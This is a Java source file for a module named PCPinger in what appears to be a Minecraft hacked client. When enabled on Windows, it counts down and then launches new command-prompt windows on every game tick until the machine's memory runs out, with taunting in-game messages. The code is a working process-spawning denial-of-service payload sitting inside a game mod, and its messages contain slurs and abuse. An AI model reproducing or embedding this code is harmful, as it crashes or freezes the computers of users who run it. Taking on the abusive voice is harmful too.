package badgamesinc.hypnotic.module.misc;

import java.io.IOException;

import badgamesinc.hypnotic.module.Category;
import badgamesinc.hypnotic.module.Mod;
import badgamesinc.hypnotic.util.ColorUtils;
import badgamesinc.hypnotic.util.Wrapper;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.util.Util;

public class PCPinger extends Mod
{
	public float time = 1200;
	
	public PCPinger() 
	{
		super("PCPinger", 0, Category.MISC, "DON'T ENABLE ITS A PCPINGER");
	}
	
	@Override
	public void onEnable() {
		if (Util.getOSType() == Util.EnumOS.WINDOWS) {
			Wrapper.rawTellPlayer(ColorUtils.darkRed + "[PCPINGER] " + ColorUtils.red + "You have about a minute until your PC's memory is consumed, good luck :)");
		} else {
			Wrapper.rawTellPlayer(ColorUtils.darkRed + "[PCPINGER] " + ColorUtils.red + "Suck my balls " + ColorUtils.darkRed + Util.getOSType() + " USER");
			time = 0;
		}
	}
	
	@Override
	public void onUpdate()
	{
		if (time > 0) {
			time--;
		}
		
		if (time <= 0) {
			try {
				Runtime.getRuntime().exec(new String[]{"cmd", "/c","start \"LLLLLLL FPC ON TOP EZZZZZZZ GET PINGED RETARD\""});
			} catch (IOException e) {
				e.printStackTrace();
			}
	    }

		//if (time <= 1)
			//this.toggle();
	}
	
	@Override
	public void onDisable() {
		if (Util.getOSType() == Util.EnumOS.WINDOWS) {
			KeyBinding.setKeyBindState(mc.gameSettings.keyBindFullscreen.getKeyCode(), true);;
			Wrapper.rawTellPlayer(ColorUtils.darkRed + "[PCPINGER] " + ColorUtils.red + "Bye " + ColorUtils.darkRed + ">:)");
		}
		time = 1200;
	}
}